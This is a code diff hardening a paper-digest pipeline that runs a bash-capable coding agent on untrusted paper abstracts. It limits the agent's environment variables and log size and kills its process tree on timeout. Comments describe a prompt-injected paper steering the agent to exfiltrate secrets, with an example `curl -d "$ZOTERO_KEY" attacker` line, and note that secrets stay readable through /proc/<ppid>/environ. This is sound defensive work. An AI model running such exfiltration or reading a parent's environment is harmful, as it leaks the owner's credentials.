@@ -15,7 +15,7 @@ Flow:
         -> _filter_keywords
         -> _filter_sent_history
         -> HarnessAgent.generate   # the only LLM call site
-        -> construct_email.render_email
+        -> construct_email.render_email_with_shown   # HTML + actually-shown URLs
         -> notifier.send
 
 Failure modes always degrade to embedding-order so the daily email goes out.
@@ -23,11 +23,14 @@ Failure modes always degrade to embedding-order so the daily email goes out.
 
 from __future__ import annotations
 
+import contextlib
 import datetime as _dt
+import importlib.util
 import json
 import os
 import re
 import shutil
+import signal
 import subprocess
 import time
 import uuid
@@ -38,12 +41,79 @@ from omegaconf import DictConfig, ListConfig
 from pyzotero import zotero
 from tqdm import tqdm
 
-from .construct_email import render_email
+from .construct_email import render_email_with_shown
 from .harness import HarnessAgent
 from .protocol import CorpusPaper, Paper
 from .reranker import get_reranker_cls
 from .retriever import get_retriever_cls
 from .utils import glob_match
+
+# RES-1/RES-2: hard bounds for the Pi subprocess. The agent is a real coding
+# agent with bash access, so neither its output (parent OOM) nor its process
+# tree (orphaned grandchildren) may be left unbounded.
+PI_LOG_READ_BYTES = 1 << 20  # at most 1 MiB read back from the agent log
+PI_LOG_TAIL_CHARS = 12000  # how much of that log we print to the workflow log
+
+
+def _kill_process_group(proc: subprocess.Popen) -> None:
+    """SIGKILL a child process *and* everything it spawned.
+
+    The Pi agent shells out (``execFile("uv", ["run", ...])`` →
+    ``fetch_text.py`` → multiprocessing workers), so killing only the direct
+    child would reparent those grandchildren to PID 1 where they keep burning
+    CPU/network and holding the inherited environment. On POSIX the child is
+    started with ``start_new_session=True`` (its own process group/session), so
+    ``killpg`` takes the whole tree down; on Windows — where ``killpg`` does not
+    exist — fall back to killing the direct child.
+    """
+    if proc.poll() is not None:
+        return
+    try:
+        if os.name == "posix":
+            os.killpg(os.getpgid(proc.pid), signal.SIGKILL)
+        else:
+            proc.kill()
+    except OSError:
+        # Group already gone (or not ours): still try the direct child.
+        with contextlib.suppress(Exception):
+            proc.kill()
+
+
+def _read_log_tail(path: Path, max_bytes: int = PI_LOG_READ_BYTES) -> tuple[str, bool]:
+    """Read at most ``max_bytes`` from the END of a log file (bounded memory).
+
+    Returns ``(text, truncated)`` — ``truncated`` is True when the file was
+    larger than the cap and we deliberately kept only its tail.
+    """
+    try:
+        size = path.stat().st_size
+        with open(path, "rb") as fh:
+            truncated = size > max_bytes
+            if truncated:
+                fh.seek(size - max_bytes)
+            data = fh.read(max_bytes)
+    except OSError:
+        return "", False
+    return data.decode("utf-8", errors="replace"), truncated
+
+
+def _cap_log_file(path: Path, max_bytes: int = PI_LOG_READ_BYTES) -> None:
+    """Shrink an oversized agent log on disk to its last ``max_bytes``.
+
+    ``cache_dir`` (``.cache``) is uploaded by the workflow's cache step, so a
+    runaway agent must not be able to push gigabytes of log into it. Best
+    effort: any failure is ignored (the log is diagnostic, never load-bearing).
+    """
+    try:
+        size = path.stat().st_size
+        if size <= max_bytes:
+            return
+        with open(path, "rb") as fh:
+            fh.seek(size - max_bytes)
+            tail = fh.read(max_bytes)
+        path.write_bytes(tail)
+    except OSError:
+        pass
 
 
 def normalize_path_patterns(patterns: list[str] | ListConfig | None, config_key: str) -> list[str] | None:
@@ -89,13 +159,50 @@ class Executor:
             "llm.api.base_url": self.config.llm.api.get("base_url"),
             "llm.generation_kwargs.model": self.config.llm.generation_kwargs.get("model"),
         }
-        reranker = self.config.executor.get("reranker", "local")
+        # The reranker is an optional enhancement and the pipeline already has a
+        # documented degradation chain (reranker failure -> warn + skip min_score,
+        # send in fetch order). A missing reranker config therefore must NOT fail
+        # the whole digest: that would turn "no embedding API configured" into
+        # "no email at all today". Warn loudly and degrade instead; the other
+        # required entries (zotero/email/llm) still fail fast.
+        reranker = self.config.executor.get("reranker", "api")
         if reranker == "api":
-            required["reranker.api.key"] = self.config.reranker.api.get("key")
-            required["reranker.api.base_url"] = self.config.reranker.api.get("base_url")
-            required["reranker.api.model"] = self.config.reranker.api.get("model")
+            reranker_missing = [
+                path
+                for path, value in {
+                    "reranker.api.key": self.config.reranker.api.get("key"),
+                    "reranker.api.base_url": self.config.reranker.api.get("base_url"),
+                    "reranker.api.model": self.config.reranker.api.get("model"),
+                }.items()
+                if _missing(value)
+            ]
+            if reranker_missing:
+                logger.warning(
+                    "executor.reranker is 'api' but "
+                    + ", ".join(reranker_missing)
+                    + " is/are missing: this run will degrade to unscored fetch order "
+                    "(min_score is skipped too). Set reranker.api.* in CUSTOM_CONFIG, or set "
+                    "executor.reranker: 'local' and install the optional extra."
+                )
         else:
-            required["reranker.local.model"] = self.config.reranker.local.get("model")
+            if _missing(self.config.reranker.local.get("model")):
+                logger.warning(
+                    "executor.reranker is 'local' but reranker.local.model is missing: this run "
+                    "will degrade to unscored fetch order (min_score is skipped too)."
+                )
+            # ENG-2: 'local' needs the optional 'local-reranker' extra
+            # (sentence-transformers + torch). Without it the reranker raises on
+            # first use, the exception is swallowed by the degradation chain and
+            # the email goes out UNSCORED with no visible explanation. Warn
+            # loudly at startup so that is never a silent surprise.
+            if importlib.util.find_spec("sentence_transformers") is None:
+                logger.warning(
+                    "executor.reranker is 'local' but the optional dependency "
+                    "'sentence-transformers' is not installed: the local reranker will fail and "
+                    "this run will degrade to unscored fetch order (min_score is skipped too). "
+                    "Install it with `pip install -e '.[local-reranker]'` (or "
+                    "`uv sync --extra local-reranker`) or switch to `executor.reranker: api`."
+                )
 
         missing = [path for path, value in required.items() if _missing(value)]
         if missing:
@@ -433,13 +540,31 @@ class Executor:
             in_path.write_text(json.dumps(input_payload, ensure_ascii=False), "utf8")
             if out_path.exists():
                 out_path.unlink()
-            # The Pi agent is a REAL coding agent with bash access and is fed
-            # untrusted external content (paper titles/abstracts/full texts).
-            # Inheriting every workflow secret would let a prompt-injected
-            # paper exfiltrate them via curl — pass a minimal env instead.
+            # SEC-1 (minimal env): the Pi agent is a REAL coding agent with
+            # bash access and is fed untrusted external content (paper
+            # titles/abstracts/full texts). Inheriting the whole workflow env
+            # would let a prompt-injected paper exfiltrate the secrets
+            # (``curl -d "$ZOTERO_KEY" attacker``), so only the variables the
+            # agent genuinely needs are forwarded:
+            #   * PATH / HOME / LANG      — runtime basics for node + uv
+            #   * LLM_API_KEY / OPENAI_API_KEY / OPENAI_API_BASE — its own model
+            #   * OPENCODE_SESSION_ID     — OpenCode Go session/prompt-cache affinity
+            #   * UV_CACHE_DIR            — reuse the warmed uv cache (if set)
+            #   * ANYSEARCH_API_KEY       — the agent's optional search_web tool
+            # Deliberately NOT forwarded: ZOTERO_KEY, SENDER_PASSWORD,
+            # RERANKER_API_KEY, CUSTOM_CONFIG, GITHUB_TOKEN, ...
+            #
+            # KNOWN RESIDUAL RISK (do not oversell this as isolation): the child
+            # runs as the SAME user, so a bash-capable agent can still read the
+            # parent's full environment via ``/proc/<ppid>/environ`` (or
+            # `/proc/self/environ` of any sibling) and recover those secrets
+            # anyway. This is mitigation for the common injection path, not a
+            # sandbox — real isolation requires a separate user or a container,
+            # which is tracked separately from this fix.
             env = {
                 "PATH": os.environ.get("PATH", ""),
                 "HOME": os.environ.get("HOME", ""),
+                "LANG": os.environ.get("LANG", "C.UTF-8"),
                 "LLM_API_KEY": api_key,
                 "OPENAI_API_KEY": api_key,
                 "OPENAI_API_BASE": api_base or "https://opencode.ai/zen/go/v1",
@@ -450,31 +575,58 @@ class Executor:
             if os.environ.get("ANYSEARCH_API_KEY"):
                 env["ANYSEARCH_API_KEY"] = os.environ["ANYSEARCH_API_KEY"]
             timeout = int(harness_cfg.get("pi_timeout", 7200))
-            proc = subprocess.run(
-                [node, str(run_mjs), "--input", str(in_path), "--output", str(out_path)],
-                env=env,
-                capture_output=True,
-                text=True,
-                timeout=timeout,
-            )
-            if proc.returncode != 0:
-                logger.warning(f"Pi agent exited {proc.returncode}: {proc.stderr[-500:]}")
+            # RES-1: stream the agent's stdout+stderr into a LOG FILE instead
+            # of an unbounded in-memory pipe (``capture_output=True`` buffers
+            # everything and only truncates afterwards, so one runaway
+            # ``yes | head -c 2G`` OOMs the parent). Memory stays flat; we read
+            # back a bounded tail for the workflow log below.
+            # RES-2: start the child in its own session so a timeout can kill
+            # the whole process group (grandchildren included).
+            log_path = cache_dir / "pi_agent.log"
+            timed_out = False
+            with open(log_path, "wb") as log_file:
+                proc = subprocess.Popen(
+                    [node, str(run_mjs), "--input", str(in_path), "--output", str(out_path)],
+                    env=env,
+                    stdout=log_file,
+                    stderr=subprocess.STDOUT,
+                    start_new_session=(os.name == "posix"),
+                )
+                try:
+                    proc.wait(timeout=timeout)
+                except subprocess.TimeoutExpired:
+                    timed_out = True
+                    logger.warning(f"Pi agent timed out after {timeout}s; killing its process group")
+                    _kill_process_group(proc)
+                    try:
+                        proc.wait(timeout=30)
+                    except subprocess.TimeoutExpired:
+                        logger.warning("Pi agent process group still alive 30s after SIGKILL")
+                finally:
+                    # Belt and braces: on ANY exit path (return, exception,
+                    # cancellation) no child/grandchild may survive us.
+                    _kill_process_group(proc)
+            if timed_out:
                 return None
-            # Keep the agent's own tool log (stderr) + final summary (stdout)
-            # visible in the workflow log at INFO level — the owner reviews
-            # the daily run there, and DEBUG mode skips sending so it cannot
-            # be used for a real send test.
-            if proc.stderr.strip():
-                logger.info(f"Pi agent tool log:\n{proc.stderr[-12000:]}")
-            if proc.stdout.strip():
-                logger.info(f"Pi agent stdout:\n{proc.stdout.strip()[-2000:]}")
+            log_tail, log_truncated = _read_log_tail(log_path)
+            if log_truncated:
+                # .cache is uploaded by the cache step — keep the on-disk log
+                # bounded as well, not just what we hold in memory.
+                _cap_log_file(log_path)
+                log_tail = f"... (log truncated; showing the last {PI_LOG_READ_BYTES} bytes)\n" + log_tail
+            if proc.returncode != 0:
+                logger.warning(f"Pi agent exited {proc.returncode}: {log_tail[-500:]}")
+                return None
+            # Keep the agent's own tool log + final summary visible in the
+            # workflow log at INFO level — the owner reviews the daily run
+            # there, and DEBUG mode skips sending so it cannot be used for a
+            # real send test. Only the bounded tail is ever printed.
+            if log_tail.strip():
+                logger.info(f"Pi agent tool log:\n{log_tail[-PI_LOG_TAIL_CHARS:]}")
             if not out_path.exists():
                 logger.warning("Pi agent finished without writing a digest")
                 return None
             data = json.loads(out_path.read_text("utf8"))
-        except subprocess.TimeoutExpired:
-            logger.warning(f"Pi agent timed out after {timeout}s")
-            return None
         except Exception as exc:
             logger.warning(f"Pi agent failed: {exc}")
             return None
@@ -662,49 +814,6 @@ class Executor:
     # Main pipeline
     # ------------------------------------------------------------------
 
-    @staticmethod
-    def _collect_shown_urls(digest, originals: list[Paper], candidate_count: int, ranked: list[Paper]) -> set[str]:
-        """URLs of every paper actually rendered in the email (for sent-history).
-
-        The email shows: picked cards + ALL unpicked candidates (the "other
-        candidates" block) + any rescued pool paper the agent scored in
-        ``others`` — mirror the render logic exactly so nothing shown to the
-        reader is re-shown on a later day. ``originals`` is the index space
-        the digest refers to; ``ranked`` is the fallback list when there is
-        no digest.
-        """
-        shown: set[str] = set()
-        if digest:
-            # Rescued pool papers (beyond candidates) the agent scored are
-            # rendered in the others block — record them in BOTH branches
-            # (a digest with an empty papers list still shows the others
-            # block with every unpicked candidate plus rescued papers).
-            for o in digest.others or []:
-                idx = int(o.get("index", -1))
-                if 0 <= idx < len(originals):
-                    shown.add(originals[idx].url)
-            if digest.papers:
-                picked = {
-                    dp.index for dp in digest.papers
-                    if dp.index is not None and 0 <= dp.index < len(originals)
-                }
-                for dp in digest.papers:
-                    if dp.index is not None and 0 <= dp.index < len(originals):
-                        shown.add(originals[dp.index].url)
-                # Every unpicked candidate is rendered in the others block —
-                # record all of them, not just the ones the agent scored.
-                for i in range(min(candidate_count, len(originals))):
-                    if i not in picked:
-                        shown.add(originals[i].url)
-            else:
-                # Empty papers list: the others block still lists every
-                # candidate (nothing was picked).
-                for i in range(min(candidate_count, len(originals))):
-                    shown.add(originals[i].url)
-        else:
-            shown.update(p.url for p in ranked)
-        return shown
-
     def run(self):
         t0 = time.time()
         corpus = self.fetch_zotero_corpus()
@@ -834,7 +943,11 @@ class Executor:
 
         logger.info("Rendering email...")
         language = (self.config.llm or {}).get("language", "English")
-        html_content = render_email(
+        # BUG-1: the renderer returns exactly the URLs it emitted (picked cards
+        # + the others entries actually shown after the max_others cap), and
+        # that set — not a re-derived superset — is what goes into
+        # sent-history below.
+        html_content, shown_urls = render_email_with_shown(
             digest, originals=originals, language=language,
             candidate_count=candidate_count, failures=source_failures,
         )
@@ -866,8 +979,7 @@ class Executor:
             # actually delivered, so a missed email is retried tomorrow.
             if ranked and delivered and self.config.executor.get("dedupe_history", True):
                 sent = self._load_sent_history()
-                shown = self._collect_shown_urls(digest, originals, candidate_count, ranked)
-                sent.update(shown)
+                sent.update(shown_urls)
                 self._save_sent_history(sent)
 
             logger.info(
